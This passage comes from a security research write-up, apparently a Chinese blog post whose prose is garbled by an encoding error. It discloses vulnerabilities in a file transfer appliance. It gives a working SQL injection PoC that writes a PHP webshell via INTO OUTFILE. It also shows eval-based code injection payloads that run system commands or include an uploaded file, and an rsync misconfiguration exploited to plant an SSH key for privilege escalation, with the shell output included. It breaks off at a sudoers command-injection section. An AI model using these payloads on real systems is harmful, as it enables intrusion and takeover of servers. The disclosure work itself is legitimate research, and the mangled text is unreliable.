&lt;p&gt;æ­¤å¤–ï¼Œåœ¨ FTA ä¸­è³‡æ–™åº«ä½¿ç”¨è€…ç‚º root å…·æœ‰ FILE_PRIV æ¬Šé™ï¼Œå› æ­¤å¯ä½¿ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;INTO OUTFILE&lt;/code&gt; æ’°å¯«è‡ªå·± PHP ä»£ç¢¼è‡³å¯å¯«ç›®éŒ„é”æˆé ç«¯ä»£ç¢¼åŸ·è¡Œï¼&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PoC&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://&amp;lt;fta&amp;gt;/courier/1000@/security_key2.api -d &lt;span class=&quot;s2&quot;&gt;&amp;quot;aid=1000&amp;amp;user_id=1&amp;amp;password=1&amp;amp;client_id=&amp;#39; OR 1=1 LIMIT 1 INTO OUTFILE &amp;#39;/home/seos/courier/themes/templates/.cc.php&amp;#39; LINES TERMINATED BY 0x3c3f...#&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;ç”Ÿæˆçš„ PHP æª”æ¡ˆä½ç½®åœ¨&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://&amp;lt;fta&amp;gt;/courier/themes/templates/.cc.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;known-secret-key-leads-to-remote-code-execution&quot;&gt;Known Secret-Key leads to Remote Code Execution&lt;/h4&gt;

&lt;p&gt;åœ¨å‰å€‹å¼±é»ä¸­ï¼Œè¦é”æˆé ç«¯ä»£ç¢¼åŸ·è¡Œé‚„æœ‰ä¸€å€‹æ¢ä»¶æ˜¯è¦å­˜åœ¨å¯å¯«ç›®éŒ„ï¼Œä½†ç¾å¯¦ä¸­æœ‰æ©Ÿç‡æ‰¾ä¸åˆ°å¯å¯«çš„ç›®éŒ„æ”¾ç½® Webshellï¼Œå› æ­¤ç„¡æ³•å¾ SQL Injection é”æˆä»£ç¢¼åŸ·è¡Œï¼Œä¸éé€™æ™‚æœ‰å¦å¤–ä¸€æ¢è·¯å¯ä»¥å¹«åŠ©æˆ‘å€‘é”æˆé ç«¯ä»£ç¢¼åŸ·è¡Œã€‚&lt;/p&gt;

&lt;p&gt;é€™å€‹å¼±é»çš„å‰ææ¢ä»¶æ˜¯ &lt;strong&gt;å·²çŸ¥è³‡æ–™åº«ä¸­æ‰€å­˜çš„åŠ å¯† KEY&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;é€™é»å°æˆ‘å€‘ä¾†èªªä¸æ˜¯å•é¡Œï¼Œå¾å‰é¢çš„ SQL Injection å¼±é»å¯ä»»æ„è®€å–è³‡æ–™åº«å…§å®¹ï¼Œå¦å¤–é›–ç„¶åœ¨ç¨‹å¼ç¢¼ä¸­æœ‰å°åƒæ•¸é€²è¡Œä¸€äº›éæ¿¾ï¼Œä½†é‚£äº›éæ¿¾æ˜¯å¯ä»¥ç¹éçš„ï¼&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/sfUtils.api&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fc&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/(.+)\(.*\)/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;delete_session_cache&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;delete_user_contact&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;valid_password&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_password_update_disallowed&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_password_format_disallowed&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;get_user_contact_list&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_email_verified&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_exist_allow_direct_download&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_profile_auth&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;get_user_contact_list&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/[\\\/&amp;quot;\*\:\?\&amp;lt;\&amp;gt;\|&amp;amp;]/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;echo(count(&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;(&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;, array(&amp;quot;nickname&amp;quot;=&amp;gt;&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;))));&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;p1&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;p&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\\\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;$&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\\$&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;p&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;echo(&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;(&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;, &amp;quot;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;));&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å¦‚æœå·²çŸ¥åŠ å¯† KEY çš„è©±ï¼Œå³å¯æ§åˆ¶ &lt;code class=&quot;highlighter-rouge&quot;&gt;decrypt( $_POST[fc] )&lt;/code&gt; çš„è¼¸å‡ºï¼Œè€Œå¾Œé¢çš„æ­£è¦è¡¨ç¤ºå¼é›–ç„¶é‡å°å‡½æ•¸åç¨±é€²è¡Œç™½åå–®éæ¿¾ï¼Œä½†æ˜¯æ²’å°åƒæ•¸é€²è¡Œéæ¿¾ï¼Œå¦‚æ­¤ä¸€ä¾†æˆ‘å€‘å¯ä»¥åœ¨åƒæ•¸çš„éƒ¨åˆ†æ’å…¥ä»»æ„ä»£ç¢¼ï¼Œå”¯ä¸€çš„æ¢ä»¶å°±æ˜¯ä¸èƒ½æœ‰ &lt;code class=&quot;highlighter-rouge&quot;&gt;(&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;)&lt;/code&gt; å‡ºç¾ï¼Œä½†ç”±æ–¼ PHP çš„é¬†æ•£ç‰¹æ€§ï¼Œç©æ³•å…¶å¯¦å¾ˆå¤šï¼Œé€™è£¡åˆ—èˆ‰å…©å€‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
ç›´æ¥é€éåå¼•è™ŸåŸ·è¡Œç³»çµ±æŒ‡ä»¤ï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(`$_POST[cmd]`);&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
æ›´å„ªé›…çš„æ–¹å¼å¯ä»¥é€é include èªæ³•å¼•å…¥ä¸Šå‚³æª”æ¡ˆçš„ tmp_nameï¼Œé€™æ¨£å„ç¨®ä¿è­·éƒ½ä¸ç”¨æ“”å¿ƒï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(include $_FILES[file][tmp_name]);&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;local-privilege-escalation-cve-2016-2352-and-cve-2016-2353&quot;&gt;Local Privilege Escalation (CVE-2016-2352 and CVE-2016-2353)&lt;/h4&gt;
&lt;p&gt;åœ¨å–å¾— PHP ç¶²é æ¬Šé™å¾Œï¼Œç™¼ç¾æ‰€å±¬æ¬Šé™ç‚º nobodyï¼Œç‚ºäº†é€²è¡Œæ›´æ·±å…¥çš„ç ”ç©¶ï¼Œåœ¨å°ç’°å¢ƒé€²è¡Œå¯©è¦–å¾Œï¼Œç™¼ç¾å…©å€‹å¯ç”¨ä¾†æå‡æ¬Šé™ä¹‹å¼±é»ã€‚&lt;/p&gt;

&lt;h5 id=&quot;1-rsync-é…ç½®éŒ¯èª¤&quot;&gt;1. Rsync é…ç½®éŒ¯èª¤&lt;/h5&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/opt/rsyncd.conf&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-lighttpd&quot; data-lang=&quot;lighttpd&quot;&gt;&lt;span class=&quot;k&quot;&gt;log&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/home/soggycat/log/kennel.log&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;soggycat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/home/soggycat&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;soggycat&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;only&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å…¶ä¸­æ¨¡çµ„åç¨± soggycat å° &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/soggycat/&lt;/code&gt; ç‚ºä»»ä½•äººå¯è®€å¯å¯«ï¼Œæ‰€ä»¥å¯å°‡ SSH Key å¯«è‡³ /home/soggycat/.ssh/ å¾Œä»¥ soggycat èº«åˆ†ç™»å…¥&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/
drwx------        &lt;span class=&quot;m&quot;&gt;4096&lt;/span&gt; 2016/01/29 18:13:41 .
-rw-r--r--         &lt;span class=&quot;m&quot;&gt;606&lt;/span&gt; 2016/01/29 18:13:41 authorized_keys

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/authorized_keys .
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat id_dsa.pub &amp;gt;&amp;gt; authorized_keys
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync authorized_keys 0::soggycat/.ssh/

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh -i id_dsa -o &lt;span class=&quot;nv&quot;&gt;UserKnownHostsFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/null -o &lt;span class=&quot;nv&quot;&gt;StrictHostKeyChecking&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no soggycat@localhost id
Could not create directory &lt;span class=&quot;s1&quot;&gt;&amp;#39;/.ssh&amp;#39;&lt;/span&gt;.
Warning: Permanently added &lt;span class=&quot;s1&quot;&gt;&amp;#39;0,0.0.0.0&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to the list of known hosts.
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;520&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;soggycat&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;2-command-injection-in-yum-clientpl&quot;&gt;2. Command Injection in â€œyum-client.plâ€&lt;/h5&gt;

&lt;p&gt;åœ¨ FTA ä¸­ï¼Œç‚ºäº†ä½¿ç³»çµ±å¯ä»¥ç›´æ¥é€éç¶²é ä»‹é¢é€²è¡Œæ›´æ–°ï¼Œå› æ­¤åœ¨ sudoers é…ç½®ä¸­ç‰¹åˆ¥é‡å° nobody ç”¨æˆ¶å…è¨±ç›´æ¥ä½¿ç”¨ root æ¬Šé™åŸ·è¡ŒæŒ‡ä»¤ï¼Œä¸¦é€é &lt;code class=&quot;highlighter-rouge&quot;&gt;yum-client.pl&lt;/code&gt; é€™éš»ç¨‹å¼é€²è¡Œè»Ÿé«”æ›´æ–°&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/sudoers&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;...
&lt;span class=&quot;nb&quot;&gt;Cmnd_Alias&lt;/span&gt;      YUM_UPGRADE = &lt;span class=&quot;sx&quot;&gt;/usr/bin/yum&lt;/span&gt; -y upgrade
